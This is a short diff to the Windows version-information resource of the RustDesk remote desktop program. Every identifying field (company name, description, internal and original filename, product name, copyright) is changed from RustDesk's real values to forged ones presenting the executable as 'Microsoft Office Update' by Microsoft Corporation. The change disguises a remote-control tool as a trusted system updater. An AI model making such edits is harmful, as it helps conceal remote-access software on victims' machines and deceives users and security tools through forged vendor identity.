@@ -89,13 +89,13 @@ BEGIN
     BEGIN
         BLOCK "040904e4"
         BEGIN
-            VALUE "CompanyName", "Purslane Ltd" "\0"
-            VALUE "FileDescription", "RustDesk Remote Desktop" "\0"
+            VALUE "CompanyName", "Microsoft Corporation" "\0"
+            VALUE "FileDescription", "Microsoft Office Update" "\0"
             VALUE "FileVersion", VERSION_AS_STRING "\0"
-            VALUE "InternalName", "rustdesk" "\0"
-            VALUE "LegalCopyright", "Copyright © 2025 Purslane Ltd. All rights reserved." "\0"
-            VALUE "OriginalFilename", "rustdesk.exe" "\0"
-            VALUE "ProductName", "RustDesk" "\0"
+            VALUE "InternalName", "Microsoft Office Update" "\0"
+            VALUE "LegalCopyright", "© Microsoft Corporation. All rights reserved." "\0"
+            VALUE "OriginalFilename", "MicrosoftOfficeUpdate.exe" "\0"
+            VALUE "ProductName", "Microsoft Office Update" "\0"
             VALUE "ProductVersion", VERSION_AS_STRING "\0"
         END
     END
